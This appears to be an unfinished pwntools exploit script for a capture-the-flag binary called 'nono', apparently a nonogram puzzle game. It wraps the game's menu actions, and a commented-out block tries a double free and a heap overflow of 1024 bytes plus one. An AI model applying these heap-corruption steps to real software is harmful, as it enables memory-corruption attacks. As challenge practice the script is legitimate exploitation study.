from pwn import *

io = process("./nono")


def play(idx):
    io.sendlineafter("Your input: ","1")
    io.sendlineafter("Index:\n",str(idx))

def add(title,size,puzzle):
    io.sendlineafter("Your input: ","2")
    io.sendlineafter("Title: ",title)
    io.sendlineafter("Size: ",str(size))
    io.sendafter("Puzzle: ",puzzle)

def delete(idx):
    io.sendlineafter("Your input: ","3")
    io.sendlineafter("Index:\n",str(idx))

def view(idx):
    io.sendlineafter("Your input: ","4")
    io.sendlineafter("Index:\n",str(idx))

"""
delete(0)
delete(0)
add("first",17,"b"*4)
add("second",17,"b"*4)
delete(0)
delete(0)
add("third",10,"c"*10)
add("fourth"*3,17,"c"*10)
add("soura",1000,("a"*1024+"\x10"))
add("third",10,"c"*10)
add("third",10,"c"*10)
gdb.attach(io)
"""
add("ente",3,"U\x01")
io.interactive()
